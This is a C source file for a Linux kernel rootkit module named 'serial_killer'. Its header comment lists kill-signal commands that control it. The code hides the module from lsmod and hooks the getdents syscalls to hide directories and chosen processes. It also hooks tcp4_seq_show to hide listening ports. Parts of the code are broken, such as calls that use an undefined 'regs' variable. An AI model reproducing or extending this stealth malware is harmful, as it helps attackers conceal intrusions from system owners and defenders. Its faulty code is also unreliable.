#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/tcp.h>
#include "version_handler.h"
#include "data_structures/linked_list.h"
#include "input_validation.h"

/* DESCRIPTION
 * Handles the presence of this rootkit - Hides from lsmod and ls
 *
 * kill -61 1 # Hide directories, processes and itself
 * kill -61 0 # Unhide directories, processes and itself
 * kill -62 <pid> # Add process to hide
 * kill -63 <pid> # Remove process to hide
 */

/* GLOBAL VARIABLES */
#define MAX_CHAR 6

linked_list_node_t *head_proc;
linked_list_node_t *head_port;
int hidden_processes_len = 0;
int hidden_ports_len = 0;
int curr_port_index = 0;
struct list_head *previous_module;
char *hidden_directories[] = {"serial_killer"};

/**********************************/

/* FUNCTION PROTOTYPES */
/*---HOOKS & ORIG---*/
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage int hook_getdents64(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
static asmlinkage int hook_getdents(const struct pt_regs *regs);

#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
#endif

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v);
/*--------------------*/

void show_lsmod(void);
void hide_lsmod(void);
void add_hidden_process(pid_t pid);
void remove_hidden_process(pid_t pid);
void free_hidden_processes(void);
void printk_hidden_processes(void);
void add_hidden_port(pid_t pid);
void remove_hidden_port(pid_t pid);
void free_hidden_ports(void);
void printk_hidden_ports(void);
/******************************************************************************************************************/

void show_lsmod(void) {
    list_add(&THIS_MODULE->list, previous_module);
    return;
}

void hide_lsmod(void)
{
    previous_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return;
}

void add_hidden_process(pid_t pid) {
    char s_pid[MAX_CHAR];
    if (!is_valid_pid(pid)) {
        return;
    }
    sprintf(s_pid, "%d", pid);
    if (!is_unique_entry(s_pid, head_proc)) {
        return;
    }
    head_proc = add_node(head_proc, s_pid, hidden_processes_len);
    hidden_processes_len = get_linked_list_len(head_proc);
    return;
}

void remove_hidden_process(pid_t pid) {
    char s_pid[MAX_CHAR];
    if (!is_valid_pid(pid)) {
        return;
    }
    sprintf(s_pid, "%d", pid);
    head_proc = remove_node(head_proc, s_pid, hidden_processes_len);
    hidden_processes_len = get_linked_list_len(head_proc);
    return;
}

void free_hidden_processes(void) {
    free_nodes(head_proc);
    hidden_processes_len = 0;
    return;
}
void printk_hidden_processes(void) {
    printk(KERN_DEBUG "serial_killer: hidden process linked list (%d) - ", hidden_processes_len);
    printk_nodes(head_proc);
    return;
}

void add_hidden_port(pid_t pid) {
    char s_port[MAX_CHAR];
    if (!is_valid_port(pid)) {
        return;
    }
    sprintf(s_port, "%d", pid);
    if (!is_unique_entry(s_port, head_port)) {
        return;
    }
    head_port = add_node(head_port, s_port, hidden_ports_len);
    hidden_ports_len = get_linked_list_len(head_port);
    return;
}
void remove_hidden_port(pid_t pid) {
    char s_port[MAX_CHAR];
    if (!is_valid_port(pid)) {
        return;
    }
    sprintf(s_port, "%d", pid);
    head_port = remove_node(head_port, s_port, hidden_ports_len);
    hidden_ports_len = get_linked_list_len(head_port);
    return;
}
void free_hidden_ports(void) {
    free_nodes(head_port);
    hidden_ports_len = 0;
    return;
}
void printk_hidden_ports(void) {
    printk(KERN_DEBUG "serial_killer: hidden ports linked list (%d) - ", hidden_ports_len);
    printk_nodes(head_port);
}

static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    char s_inet_sport[MAX_CHAR];

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
        sprintf(s_inet_sport, "%d", ntohs(is->inet_sport));
        //printk(KERN_DEBUG "serial_killer: conversion from %d to %s\n", is->inet_sport, s_inet_sport);
		if (is_present_in_linked_list(s_inet_sport, head_port)) {
            //printk(KERN_DEBUG "serial_killer: Found port %s\n", s_inet_sport);
            return 0;
		}
	}

	return orig_tcp4_seq_show(seq, v);
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int hook_getdents64(const struct pt_regs *regs)
{

    int err;
    int index;
    linked_list_node_t *curr_proc;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL)
    {
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err)
    {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories))
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    curr_proc = head_proc;
    while (curr_proc != NULL)
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {   
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            //printk(KERN_DEBUG "%s %s %d\n",curr_proc->name, current_dir->d_name, strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR));
            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
            {   
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err)
    {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(const struct pt_regs *regs)
{

    const struct linux_dirent
    {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;
    int index;
    linked_list_node_t *curr_proc;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL)
    {
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err)
    {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories))
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    curr_proc = head_proc;
    while (curr_proc != NULL)
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err)
    {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

#else
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{

    int err;
    linked_list_node_t *curr_proc;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL)
    {
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err)
    {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories))
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    curr_proc = head_proc;
    while (curr_proc != NULL)
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err)
    {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{

    const struct linux_dirent
    {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;
    linked_list_node_t *curr_proc;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL)
    {
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err)
    {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories))
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (strncmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0)
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    curr_proc = head_proc;
    while (curr_proc != NULL)
    {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret)
        {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((strncmp(curr_proc->name, current_dir->d_name, MAX_CHAR) == 0) && (strncmp(curr_proc->name, "", MAX_CHAR) != 0))
            {
                // printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker)
                {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            }
            else
            {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err)
    {
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

#endif
